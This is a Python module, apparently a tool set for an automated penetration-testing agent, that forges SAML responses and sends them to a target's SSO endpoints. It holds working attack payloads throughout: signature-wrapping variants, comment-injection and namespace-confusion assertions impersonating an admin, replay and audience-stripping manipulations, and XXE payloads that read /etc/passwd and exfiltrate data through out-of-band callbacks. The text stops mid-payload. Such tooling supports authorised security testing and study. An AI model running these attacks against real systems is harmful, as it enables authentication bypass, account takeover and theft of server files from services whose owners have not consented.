"""SAML attack tools - detect SSO endpoints, forge assertions, and exploit XML vulnerabilities."""

from __future__ import annotations

import base64
import re
import urllib.parse
from typing import Any

from config import Config
from tool_registry import Tool
from utils import run_cmd, sanitize_subprocess_arg


# ---------------------------------------------------------------------------
# XML payload templates
# ---------------------------------------------------------------------------

# Canonical valid SAML Response shell - fill in NameID and Issuer
SAML_RESPONSE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  ID="_response1" Version="2.0" IssueInstant="2024-01-01T00:00:00Z"
  Destination="{acs_url}">
  <saml:Issuer>{issuer}</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_assertion1" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>{issuer}</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#_assertion1">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>FAKE_SIG_VALUE_FOR_TESTING</ds:SignatureValue>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{nameid}</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z" Recipient="{acs_url}"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
      <saml:AudienceRestriction>
        <saml:Audience>{audience}</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2024-01-01T00:00:00Z">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>"""

# XSW variant 1 - valid assertion after signed assertion
XSW1_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Assertion ID="_evil" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>{issuer}</saml:Issuer>
    <saml:Subject>
      <saml:NameID>{evil_nameid}</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
  </saml:Assertion>
  <saml:Assertion ID="_original" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>{issuer}</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo><ds:Reference URI="#_original"/></ds:SignedInfo>
      <ds:SignatureValue>{original_sig}</ds:SignatureValue>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>{original_nameid}</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
  </saml:Assertion>
</samlp:Response>"""

# XSW variant 2 - evil assertion wraps the signed assertion
XSW2_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Assertion ID="_evil" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>{issuer}</saml:Issuer>
    <saml:Subject>
      <saml:NameID>{evil_nameid}</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
    <saml:Assertion ID="_original" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
      <saml:Issuer>{issuer}</saml:Issuer>
      <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:SignedInfo><ds:Reference URI="#_original"/></ds:SignedInfo>
        <ds:SignatureValue>{original_sig}</ds:SignatureValue>
      </ds:Signature>
      <saml:Subject>
        <saml:NameID>{original_nameid}</saml:NameID>
      </saml:Subject>
      <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
    </saml:Assertion>
  </saml:Assertion>
</samlp:Response>"""

# Void canonicalization - comment injection
COMMENT_INJECT_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Assertion ID="_a1" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>{issuer}</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{prefix}<!---->{suffix}</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
  </saml:Assertion>
</samlp:Response>"""

# XXE payloads for SAML XML parser exploitation
XXE_TEMPLATE_FILE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:Response>"""

XXE_TEMPLATE_SSRF = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "http://{callback_host}/xxe-saml">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:Response>"""

XXE_TEMPLATE_PARAM = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY % remote SYSTEM "http://{callback_host}/evil.dtd">
  %remote;
  %payload;
  %send;
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>test</saml:Issuer>
</samlp:Response>"""


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _b64_encode_xml(xml: str) -> str:
    """Base64-encode an XML string (standard, not URL-safe) for SAMLResponse POST."""
    return base64.b64encode(xml.encode("utf-8")).decode("ascii")


def _b64_decode_saml(encoded: str) -> str:
    """Decode a base64-encoded SAMLResponse, handling URL encoding first."""
    decoded_url = urllib.parse.unquote(encoded)
    # Add padding if needed
    padding = 4 - len(decoded_url) % 4
    if padding != 4:
        decoded_url += "=" * padding
    return base64.b64decode(decoded_url).decode("utf-8", errors="replace")


def _extract_saml_field(xml: str, tag: str) -> str:
    """Naive extraction of the first occurrence of a tag value from XML."""
    pattern = rf"<[^>]*{re.escape(tag)}[^>]*>([^<]+)</"
    match = re.search(pattern, xml, re.IGNORECASE)
    return match.group(1).strip() if match else ""


def _cap(text: str, limit: int = 4000) -> str:
    """Cap output to prevent context explosion."""
    if len(text) > limit:
        return text[:limit] + f"\n... [TRUNCATED - {len(text) - limit} chars omitted]"
    return text


# ---------------------------------------------------------------------------
# Core functions
# ---------------------------------------------------------------------------


def saml_detect(target: str) -> dict[str, Any]:
    """Detect SAML SSO endpoints on a target.

    Probes common SAML paths for login, ACS, metadata, and federation endpoints.
    Checks for SAMLRequest/SAMLResponse/RelayState parameters, metadata XML,
    and SSO redirect headers. Use this first when testing any application that
    may use federated identity or enterprise SSO.
    """
    target = sanitize_subprocess_arg(target, "url")
    base = target.rstrip("/")
    if not base.startswith("http"):
        base = f"https://{base}"

    saml_paths = [
        "/saml/login",
        "/saml/sso",
        "/saml/acs",
        "/auth/saml",
        "/auth/saml/callback",
        "/sso/saml",
        "/sso",
        "/saml2/sso",
        "/saml2/idp/SSO",
        "/adfs/ls",
        "/adfs/ls/IdpInitiatedSignon.aspx",
        "/FederationMetadata/2007-06/FederationMetadata.xml",
        "/saml/metadata",
        "/saml2/metadata",
        "/auth/saml/metadata",
        "/sso/metadata",
        "/.well-known/saml",
        "/api/sso/saml",
        "/login/saml",
        "/oauth/saml",
        "/idp/sso",
        "/idp/metadata",
    ]

    found: list[str] = []
    lines: list[str] = [f"[saml_detect] Scanning {base} for SAML endpoints"]

    for path in saml_paths:
        url = f"{base}{path}"
        result = run_cmd(
            ["curl", "-s", "-i", "-L", "--max-time", "8", "-w",
             "\n---STATUS---\n%{http_code}\n---REDIRECT---\n%{redirect_url}\n",
             url],
            timeout=12,
        )
        out = result.get("stdout", "")
        code_match = re.search(r"---STATUS---\s*(\d+)", out)
        redir_match = re.search(r"---REDIRECT---\s*(\S+)", out)
        code = code_match.group(1) if code_match else "000"
        redir = redir_match.group(1) if redir_match else ""

        # Indicators of SAML presence
        indicators: list[str] = []
        lower_out = out.lower()
        if "samlrequest" in lower_out or "samlresponse" in lower_out:
            indicators.append("SAMLRequest/SAMLResponse param present")
        if "relaystate" in lower_out:
            indicators.append("RelayState param")
        if "urn:oasis:names:tc:saml" in lower_out:
            indicators.append("SAML namespace in response")
        if "entitydescriptor" in lower_out or "idpsso" in lower_out:
            indicators.append("SAML metadata XML")
        if "federationmetadata" in lower_out:
            indicators.append("ADFS FederationMetadata")
        if redir and ("saml" in redir.lower() or "sso" in redir.lower()):
            indicators.append(f"SSO redirect -> {redir}")
        if code in ("200", "302", "301") and any(
            kw in lower_out for kw in ["saml", "sso", "assertion", "idp"]
        ):
            indicators.append(f"HTTP {code} with SSO content")

        if indicators or (code == "200" and "xml" in out[:500].lower()):
            entry = f"  [+] {path} (HTTP {code}): {', '.join(indicators) or 'XML response'}"
            found.append(entry)
            lines.append(entry)
        elif code not in ("404", "000"):
            lines.append(f"  [-] {path} -> HTTP {code}")

    summary = f"\n  SAML endpoints found: {len(found)}" if found else "\n  No SAML endpoints detected"
    lines.append(summary)

    return {
        "stdout": _cap("\n".join(lines)),
        "stderr": "",
        "returncode": 0 if found else 1,
        "parsed": {"endpoints_found": len(found), "details": found},
    }


def saml_signature_test(
    target: str,
    saml_response: str = "",
) -> dict[str, Any]:
    """Generate and test XML Signature Wrapping (XSW) attack variants against a SAML SP.

    Generates XSW variants 1-8 (evil assertion before/after/wrapping the signed
    legitimate assertion), tests signature exclusion (strip Signature element),
    signature value manipulation, and self-signed certificate injection. Submit
    each generated payload to the ACS endpoint and check whether the SP accepts
    the manipulated NameID, indicating a signature validation bypass.

    Use after saml_detect identifies an ACS endpoint. Provide a captured
    SAMLResponse if available for realistic payloads.
    """
    target = sanitize_subprocess_arg(target, "url")
    base = target.rstrip("/")
    if not base.startswith("http"):
        base = f"https://{base}"

    lines: list[str] = [f"[saml_signature_test] Generating XSW variants for {base}"]

    # Try to extract context from provided SAMLResponse
    original_xml = ""
    original_nameid = "legitimate@victim.com"
    issuer = "https://idp.example.com"
    original_sig = "ORIGINAL_SIG_VALUE"

    if saml_response:
        try:
            original_xml = _b64_decode_saml(saml_response)
            extracted_nameid = _extract_saml_field(original_xml, "NameID")
            if extracted_nameid:
                original_nameid = extracted_nameid
            extracted_issuer = _extract_saml_field(original_xml, "Issuer")
            if extracted_issuer:
                issuer = extracted_issuer
            sig_match = re.search(r"<ds:SignatureValue>([^<]+)</ds:SignatureValue>", original_xml)
            if sig_match:
                original_sig = sig_match.group(1).strip()
            lines.append(f"  Parsed provided SAMLResponse: NameID={original_nameid}, Issuer={issuer}")
        except Exception as exc:
            lines.append(f"  Warning: could not parse SAMLResponse - {exc}. Using template values.")

    evil_nameid = "admin@target.com"

    # Build all XSW variants
    xsw_variants = [
        ("XSW1 - evil before signed", XSW1_TEMPLATE.format(
            issuer=issuer, evil_nameid=evil_nameid,
            original_nameid=original_nameid, original_sig=original_sig,
        )),
        ("XSW2 - evil wraps signed", XSW2_TEMPLATE.format(
            issuer=issuer, evil_nameid=evil_nameid,
            original_nameid=original_nameid, original_sig=original_sig,
        )),
        ("XSW3 - no Signature element", re.sub(
            r"<ds:Signature[^>]*>.*?</ds:Signature>", "", original_xml or
            SAML_RESPONSE_TEMPLATE.format(
                issuer=issuer, nameid=evil_nameid,
                acs_url=f"{base}/saml/acs", audience=base,
            ), flags=re.DOTALL,
        )),
        ("XSW4 - empty SignatureValue", re.sub(
            r"<ds:SignatureValue>[^<]+</ds:SignatureValue>",
            "<ds:SignatureValue></ds:SignatureValue>",
            original_xml or SAML_RESPONSE_TEMPLATE.format(
                issuer=issuer, nameid=original_nameid,
                acs_url=f"{base}/saml/acs", audience=base,
            ),
        )),
        ("XSW5 - SignatureValue all-zeros", re.sub(
            r"<ds:SignatureValue>[^<]+</ds:SignatureValue>",
            "<ds:SignatureValue>" + "A" * 344 + "</ds:SignatureValue>",
            original_xml or SAML_RESPONSE_TEMPLATE.format(
                issuer=issuer, nameid=original_nameid,
                acs_url=f"{base}/saml/acs", audience=base,
            ),
        )),
        ("XSW6 - duplicate Assertion evil first", f"""<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Assertion ID="_evil" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>{issuer}</saml:Issuer>
    <saml:Subject><saml:NameID>{evil_nameid}</saml:NameID></saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
  </saml:Assertion>
  <saml:Assertion ID="_legit" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>{issuer}</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo><ds:Reference URI="#_legit"/></ds:SignedInfo>
      <ds:SignatureValue>{original_sig}</ds:SignatureValue>
    </ds:Signature>
    <saml:Subject><saml:NameID>{original_nameid}</saml:NameID></saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
  </saml:Assertion>
</samlp:Response>"""),
        ("XSW7 - self-signed cert injection", SAML_RESPONSE_TEMPLATE.format(
            issuer=issuer, nameid=evil_nameid,
            acs_url=f"{base}/saml/acs", audience=base,
        ).replace(
            "<ds:SignatureValue>FAKE_SIG_VALUE_FOR_TESTING</ds:SignatureValue>",
            "<ds:SignatureValue>ATTACKER_CONTROLLED_CERT_SIG</ds:SignatureValue>",
        )),
        ("XSW8 - response-level signature only, unsigned assertion", f"""<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r_signed" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>{issuer}</saml:Issuer>
  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
    <ds:SignedInfo><ds:Reference URI="#_r_signed"/></ds:SignedInfo>
    <ds:SignatureValue>{original_sig}</ds:SignatureValue>
  </ds:Signature>
  <saml:Assertion ID="_unsigned_evil" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>{issuer}</saml:Issuer>
    <saml:Subject><saml:NameID>{evil_nameid}</saml:NameID></saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
  </saml:Assertion>
</samlp:Response>"""),
    ]

    results: list[dict[str, Any]] = []
    acs_url = f"{base}/saml/acs"

    for variant_name, xml_payload in xsw_variants:
        encoded = _b64_encode_xml(xml_payload)
        post_data = f"SAMLResponse={urllib.parse.quote(encoded)}&RelayState=/"
        result = run_cmd(
            ["curl", "-s", "-i", "-X", "POST", "-d", post_data,
             "-H", "Content-Type: application/x-www-form-urlencoded",
             "--max-time", "10", acs_url],
            timeout=14,
        )
        out = result.get("stdout", "")
        code_match = re.search(r"^HTTP/[\d.]+ (\d+)", out, re.MULTILINE)
        code = code_match.group(1) if code_match else "000"

        # Success indicators: redirect to app, session cookie, no "invalid" message
        accepted = False
        lower_out = out.lower()
        if code in ("200", "302", "301") and not any(
            kw in lower_out for kw in ["invalid", "error", "fail", "denied", "unauthorized"]
        ):
            accepted = True
        if any(kw in lower_out for kw in ["set-cookie", "session", "token"]) and code != "401":
            accepted = True

        status = "ACCEPTED - POSSIBLE BYPASS" if accepted else f"rejected (HTTP {code})"
        entry = f"  [{'+' if accepted else '-'}] {variant_name}: {status}"
        lines.append(entry)
        results.append({
            "variant": variant_name,
            "accepted": accepted,
            "http_code": code,
            "payload_b64": encoded[:100] + "...",
        })

    lines.append(f"\n  Variants tested: {len(xsw_variants)}")
    accepted_count = sum(1 for r in results if r["accepted"])
    if accepted_count:
        lines.append(f"  VULNERABLE: {accepted_count} variant(s) accepted - SAML signature bypass confirmed")
    else:
        lines.append("  No obvious bypass detected (check responses manually for subtle acceptance)")

    return {
        "stdout": _cap("\n".join(lines)),
        "stderr": "",
        "returncode": 0,
        "parsed": {"variants_tested": len(xsw_variants), "accepted_count": accepted_count, "results": results},
    }


def saml_void_canonicalization(
    target: str,
    saml_response: str = "",
) -> dict[str, Any]:
    """Test 2025 Void Canonicalization and related XML-level SAML attacks.

    Targets XML canonicalization quirks that allow assertion manipulation:
    - Comment injection in NameID (admin<!---->\u0040victim.com strips comments post-sig)
    - Attribute pollution (duplicate attributes with different namespace prefixes)
    - Namespace confusion (redefine saml: prefix to point to attacker namespace)
    - Unicode normalization attacks (fullwidth @ U+FF20, lookalike chars in NameID)

    These attacks exploit the gap between how the XML signature validator reads
    the canonicalized form and how the application logic parses the raw XML.
    Use after confirming SAML is in use on the target.
    """
    target = sanitize_subprocess_arg(target, "url")
    base = target.rstrip("/")
    if not base.startswith("http"):
        base = f"https://{base}"

    issuer = "https://idp.example.com"
    if saml_response:
        try:
            xml = _b64_decode_saml(saml_response)
            extracted = _extract_saml_field(xml, "Issuer")
            if extracted:
                issuer = extracted
        except Exception:
            pass

    lines: list[str] = [f"[saml_void_canonicalization] Testing void canonicalization attacks on {base}"]

    # Build attack payloads
    attack_payloads = [
        ("comment_inject_nameid", COMMENT_INJECT_TEMPLATE.format(
            issuer=issuer, prefix="admin", suffix="@victim.com",
        )),
        ("comment_inject_nameid_full", COMMENT_INJECT_TEMPLATE.format(
            issuer=issuer, prefix="victim@legitimate.com<!----> admin", suffix="",
        )),
        ("attribute_pollution", f"""<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Assertion ID="_a1" Version="2.0" Version="1.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>{issuer}</saml:Issuer>
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
  </saml:Assertion>
</samlp:Response>"""),
        ("namespace_confusion", f"""<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  xmlns:evil="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Assertion ID="_a1" Version="2.0" IssueInstant="2024-01-01T00:00:00Z"
    xmlns:saml="urn:attacker:evil:namespace">
    <saml:Issuer>{issuer}</saml:Issuer>
    <evil:Subject>
      <evil:NameID>admin@target.com</evil:NameID>
    </evil:Subject>
    <evil:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
  </saml:Assertion>
</samlp:Response>"""),
        ("unicode_fullwidth_at", COMMENT_INJECT_TEMPLATE.format(
            issuer=issuer, prefix="admin\uff20victim.com", suffix="",
        ).replace("<!---->" , "")),
        ("unicode_lookalike_admin", f"""<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Assertion ID="_a1" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>{issuer}</saml:Issuer>
    <saml:Subject>
      <saml:NameID>\u0430dmin@target.com</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
  </saml:Assertion>
</samlp:Response>"""),
    ]

    results: list[dict[str, Any]] = []
    acs_url = f"{base}/saml/acs"

    for attack_name, xml_payload in attack_payloads:
        encoded = _b64_encode_xml(xml_payload)
        post_data = f"SAMLResponse={urllib.parse.quote(encoded)}&RelayState=/"
        result = run_cmd(
            ["curl", "-s", "-i", "-X", "POST", "-d", post_data,
             "-H", "Content-Type: application/x-www-form-urlencoded",
             "--max-time", "10", acs_url],
            timeout=14,
        )
        out = result.get("stdout", "")
        code_match = re.search(r"^HTTP/[\d.]+ (\d+)", out, re.MULTILINE)
        code = code_match.group(1) if code_match else "000"
        lower_out = out.lower()
        accepted = code in ("200", "302") and not any(
            kw in lower_out for kw in ["invalid", "error", "fail", "denied"]
        )
        lines.append(f"  [{'+'if accepted else '-'}] {attack_name}: HTTP {code} {'ACCEPTED' if accepted else 'rejected'}")
        results.append({"attack": attack_name, "accepted": accepted, "http_code": code})

    return {
        "stdout": _cap("\n".join(lines)),
        "stderr": "",
        "returncode": 0,
        "parsed": {"results": results},
    }


def saml_assertion_attacks(
    target: str,
    saml_response: str = "",
) -> dict[str, Any]:
    """Test SAML assertion-level manipulation attacks.

    Covers: assertion replay (resubmit a captured assertion), audience restriction
    bypass (remove or change AudienceRestriction to wildcard), time-window extension
    (set NotBefore far in the past and NotOnOrAfter far in the future), InResponseTo
    removal (convert SP-initiated to IdP-initiated to drop CSRF binding), and
    Recipient URL manipulation (change assertion Recipient to attacker URL).

    Requires a captured base64-encoded SAMLResponse for the replay and manipulation
    attacks. If none provided, generates a synthetic unsigned assertion for the
    structural bypass tests. Use after saml_detect confirms an ACS endpoint.
    """
    target = sanitize_subprocess_arg(target, "url")
    base = target.rstrip("/")
    if not base.startswith("http"):
        base = f"https://{base}"

    lines: list[str] = [f"[saml_assertion_attacks] Testing assertion manipulation on {base}"]

    original_xml = ""
    nameid = "user@victim.com"
    issuer = "https://idp.example.com"
    acs_url = f"{base}/saml/acs"

    if saml_response:
        try:
            original_xml = _b64_decode_saml(saml_response)
            extracted_nameid = _extract_saml_field(original_xml, "NameID")
            if extracted_nameid:
                nameid = extracted_nameid
            extracted_issuer = _extract_saml_field(original_xml, "Issuer")
            if extracted_issuer:
                issuer = extracted_issuer
            lines.append(f"  Using provided SAMLResponse: NameID={nameid}, Issuer={issuer}")
        except Exception as exc:
            lines.append(f"  Warning: parse failed - {exc}. Using synthetic payloads.")

    base_xml = original_xml or SAML_RESPONSE_TEMPLATE.format(
        issuer=issuer, nameid=nameid, acs_url=acs_url, audience=base,
    )

    attack_payloads: list[tuple[str, str]] = [
        # Assertion replay - resubmit captured assertion verbatim
        ("replay_verbatim", base_xml),
        # Audience restriction removal
        ("audience_restriction_removed", re.sub(
            r"<saml:AudienceRestriction>.*?</saml:AudienceRestriction>",
            "", base_xml, flags=re.DOTALL,
        )),
        # Audience wildcard
        ("audience_wildcard", re.sub(
            r"<saml:Audience>[^<]+</saml:Audience>",
            "<saml:Audience>*</saml:Audience>",
            base_xml,
        )),
        # Time window - extend validity far into future (no expiry bypass)
        ("time_window_extended", re.sub(
            r'NotOnOrAfter="[^"]+"',
            'NotOnOrAfter="2099-12-31T23:59:59Z"',
            re.sub(r'NotBefore="[^"]+"', 'NotBefore="2000-01-01T00:00:00Z"', base_xml),
        )),
        # InResponseTo removal - makes SP-initiated assertion usable for IdP-initiated flow
        ("inresponseto_removed", re.sub(
            r'\s*InResponseTo="[^"]+"', "", base_xml,
        )),
        # Recipient URL changed to target ACS
        ("recipient_changed_to_acs", re.sub(
            r'Recipient="[^"]+"',
            f'Recipient="{acs_url}"',
            base_xml,
        )),
        # Recipient URL removed entirely
        ("recipient_removed", re.sub(
            r'\s*Recipient="[^"]+"', "", base_xml,
        )),
        # NameID format changed to unspecified
        ("nameid_format_unspecified", re.sub(
            r'Format="urn:oasis:names:tc:SAML:[^"]*"',
            'Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified"',
            base_xml, count=1,
        )),
    ]

    results: list[dict[str, Any]] = []

    for attack_name, xml_payload in attack_payloads:
        encoded = _b64_encode_xml(xml_payload)
        post_data = f"SAMLResponse={urllib.parse.quote(encoded)}&RelayState=/"
        result = run_cmd(
            ["curl", "-s", "-i", "-X", "POST", "-d", post_data,
             "-H", "Content-Type: application/x-www-form-urlencoded",
             "--max-time", "10", acs_url],
            timeout=14,
        )
        out = result.get("stdout", "")
        code_match = re.search(r"^HTTP/[\d.]+ (\d+)", out, re.MULTILINE)
        code = code_match.group(1) if code_match else "000"
        lower_out = out.lower()
        accepted = code in ("200", "302") and not any(
            kw in lower_out for kw in ["invalid", "error", "fail", "denied", "expired"]
        )
        lines.append(f"  [{'+'if accepted else '-'}] {attack_name}: HTTP {code} {'ACCEPTED' if accepted else 'rejected'}")
        results.append({"attack": attack_name, "accepted": accepted, "http_code": code})

    accepted_count = sum(1 for r in results if r["accepted"])
    if accepted_count:
        lines.append(f"\n  FINDINGS: {accepted_count} manipulation(s) accepted")
    else:
        lines.append("\n  No assertion manipulation bypasses detected")

    return {
        "stdout": _cap("\n".join(lines)),
        "stderr": "",
        "returncode": 0,
        "parsed": {"accepted_count": accepted_count, "results": results},
    }


def saml_xxe_test(target: str) -> dict[str, Any]:
    """Test for XXE (XML External Entity) injection via SAML XML parsing.

    Injects DTD declarations into the SAML request/response XML to trigger:
    - File read via SYSTEM entity (file:///etc/passwd)
    - SSRF via HTTP entity callback (detects blind XXE with out-of-band)
    - Parameter entity injection (for multi-stage blind XXE exfiltration)
    - Internal network port scanning via XXE SSRF (localhost:22, :6379, :9200)

    Sends crafted payloads to the target's ACS and login endpoints. Any HTTP
    callback to the SSRF listener indicates XXE. Use a collaborator/interactsh
    host for blind XXE detection. Use after saml_detect finds SAML endpoints.
    """
    target = sanitize_subprocess_arg(target, "url")
    base = target.rstrip("/")
    if not base.startswith("http"):
        base = f"https://{base}"

    lines: list[str] = [f"[saml_xxe_test] Testing XXE via SAML XML on {base}"]

    # Common SAML endpoints to POST to
    saml_endpoints = [
        "/saml/acs",
        "/auth/saml/callback",
        "/saml/login",
        "/sso/saml",
        "/adfs/ls",
    ]

    # Build XXE payloads
    callback_host = "xxe.burpcollaborator.net"  # Replace with live collaborator

    payloads: list[tuple[str, str]] = [
        ("xxe_file_read_etc_passwd", XXE_TEMPLATE_FILE),
        ("xxe_ssrf_callback", XXE_TEMPLATE_SSRF.format(callback_host=callback_host)),
        ("xxe_param_entity_blind", XXE_TEMPLATE_PARAM.format(callback_host=callback_host)),
        ("xxe_ssrf_localhost_22", f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "http://localhost:22">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:Response>"""),
        ("xxe_ssrf_redis_6379", f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
